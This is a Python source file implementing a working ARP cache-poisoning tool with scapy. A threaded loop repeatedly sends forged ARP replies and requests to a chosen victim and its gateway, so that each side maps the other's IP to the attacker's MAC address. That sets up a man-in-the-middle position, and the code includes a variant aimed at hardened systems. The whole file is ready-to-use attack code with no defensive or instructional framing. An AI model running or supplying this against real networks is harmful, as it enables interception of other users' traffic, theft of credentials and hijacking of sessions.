import scapy.all as sc;
from scapy.layers.l2 import ARP;
import time;
import threading;

class ARPPoisoner:
    def __init__(self, interface, victim_ip, gateway_ip, attacker_mac, logger):
        self.interface = interface
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.attacker_mac = attacker_mac
        self.logger = logger

    # Get mac adress of a given IP adress
    def get_mac(self, ip):
        arp = sc.ARP(pdst=ip)
        broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast / arp
        answered = sc.srp(packet, timeout=2, verbose=False, iface=self.interface)[0]
        for _, received in answered:
            return received.hwsrc
        return None

    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self.start_loop)
        self.thread.daemon = True
        self.thread.start()

    def stop(self):
        self.running = False

        
        if self.thread:
            self.thread.join(timeout=10)

    def start_loop(self):
        # Re-poison the ARP table every 3 seconds.
        while self.running:
            self.arp_poisoning_loop()
            time.sleep(3)

    # Do the poisoning
    def arp_poisoning_loop(self):
        def log(msg):
            if self.logger:
                self.logger(msg)
            else:
                print(msg)

        try:
            victim_mac = self.get_mac(self.victim_ip)

            if not victim_mac:
                log("Failed getting victim mac")
                return
            
            gateway_mac = self.get_mac(self.gateway_ip)

            if not gateway_mac:
                log("Failed getting gateway mac")
                return

            # Tell the victim that we are the gateway.
            # 1. ARP Reply (is-at) - standard poisoning
            victim_arp_reply = (
                sc.Ether(dst=victim_mac) /
                ARP(
                    op=2,
                    pdst=self.victim_ip,
                    hwdst=victim_mac,
                    psrc=self.gateway_ip,
                    hwsrc=self.attacker_mac
                )
            )
            # 2. ARP Request (who-has) - forces cache update on some hardened OSs
            victim_arp_req = (
                sc.Ether(dst=victim_mac) /
                ARP(
                    op=1,
                    pdst=self.victim_ip,
                    hwdst=victim_mac,
                    psrc=self.gateway_ip,
                    hwsrc=self.attacker_mac
                )
            )

            # Tell the gateway that we are the victim
            gateway_arp_reply = (
                sc.Ether(dst=gateway_mac) /
                ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=gateway_mac,
                    psrc=self.victim_ip,
                    hwsrc=self.attacker_mac
                )
            )
            gateway_arp_req = (
                sc.Ether(dst=gateway_mac) /
                ARP(
                    op=1,
                    pdst=self.gateway_ip,
                    hwdst=gateway_mac,
                    psrc=self.victim_ip,
                    hwsrc=self.attacker_mac
                )
            )

            # Send the poisoned packets (Both Reply and Request)
            sc.sendp(victim_arp_reply, verbose=0, iface=self.interface)
            sc.sendp(victim_arp_req, verbose=0, iface=self.interface)
            sc.sendp(gateway_arp_reply, verbose=0, iface=self.interface)
            sc.sendp(gateway_arp_req, verbose=0, iface=self.interface)

            log("Poison success :D")

        except Exception as e:
            log(f"Error during ARP poisoning: {e}")
    
